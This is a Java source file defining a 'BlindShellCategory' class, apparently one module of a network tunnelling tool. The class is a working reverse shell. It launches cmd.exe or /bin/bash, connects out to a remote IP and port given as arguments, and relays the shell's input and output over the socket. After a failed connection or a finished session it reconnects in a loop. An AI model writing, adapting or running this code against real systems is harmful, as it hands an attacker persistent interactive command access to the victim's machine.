package cc.co.geniusman.category;

import java.io.IOException;
import java.net.ConnectException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;

import org.apache.log4j.Logger;

import cc.co.geniusman.combine.CombineSocket;
import cc.co.geniusman.util.Util;

public class BlindShellCategory extends AbstractCategory {
	/** log4j instance **/
	private static Logger log = Logger.getLogger(BlindShellCategory.class);

	@Override
	protected boolean checkArgument() {
		int transPort = argument.tranPort;
		// check port
		if (transPort <= 0 || transPort > 65535) {
			throw new RuntimeException("transPort is incorrect.. "
					+ "input the correct transPort");
		}
		return true;
	}

	@Override
	protected void transmitPort() {
		// local Port and remote port
		int transPort = argument.tranPort;

		// local IP address and remote IP address
		String remoteHostIp = argument.remoteIp;

		// define the two socket
		Socket transSocket = null;
		Process process = null;

		try {
			while (true) {
				// attach to process
				try {
					process = bindToProcess();
				} catch (IOException ex) {
					log.error("bindToProcess IOException occured..", ex);
					Thread.sleep(1000);
					return;
				}

				try {
					transSocket = new Socket();
					transSocket.connect(
							new InetSocketAddress(InetAddress
									.getByName(remoteHostIp), transPort),
							Util.SOCKET_TIME);
				} catch (UnknownHostException ex) {
					log.error("Socket UnknownHostException occured..", ex);
					Util.close(process);
					Thread.sleep(1000);
					continue;
				} catch (SocketTimeoutException ex) {
					log.error("SocketTimeoutException occured..", ex);
					Util.close(process);
					Thread.sleep(1000);
					continue;
				} catch (ConnectException ex) {
					log.error("ConnectException occured..", ex);
					Util.close(process);
					Thread.sleep(1000);
					continue;
				} catch (IOException ex) {
					log.error("Socket IOException occured..", ex);
					Util.close(process);
					Thread.sleep(1000);
					continue;
				}

				if (log.isInfoEnabled()) {
					log.info("Sucessfully Connected to " + transSocket
							+ " in port: " + transPort);
				}

				if (log.isInfoEnabled()) {
					log.info("Ready to combine the socket input and output stream..");
				}

				// create two thread to combine the is and os
				Thread thread1 = new Thread(
						new CombineSocket(process.getInputStream(),
								transSocket.getOutputStream()));
				Thread thread2 = new Thread(
						new CombineSocket(transSocket.getInputStream(),
								process.getOutputStream()));
				thread1.start();
				thread2.start();

				try {
					thread1.join();
					thread2.join();
				} catch (InterruptedException e) {
					log.error("Thread Join InterruptedException occured..", e);
					Util.close(process);
					continue;
				}
			}
		} catch (Exception e) {
			throw new RuntimeException("Exception occured..", e);
		} finally {
			Util.close(process);
			Util.close(transSocket);
		}
	}

	/**
	 * bindToProcess
	 * 
	 * @return Process
	 * @throws IOException
	 */
	private Process bindToProcess() throws IOException {
		if (log.isInfoEnabled()) {
			log.info("OS type is " + Util.OS_NAME);
		}
		String command = "";
		if (Util.OS_NAME.indexOf(Util.WINDOWS) >= 0) {
			command = "cmd.exe";
		} else if (Util.OS_NAME.indexOf(Util.LINUX) >= 0) {
			command = "/bin/bash";
		}
		if (log.isInfoEnabled()) {
			log.info("The exec command is " + command);
		}
		ProcessBuilder builder = new ProcessBuilder(command);
		builder.redirectErrorStream(true);
		Process process = builder.start();
		return process;
	}

}
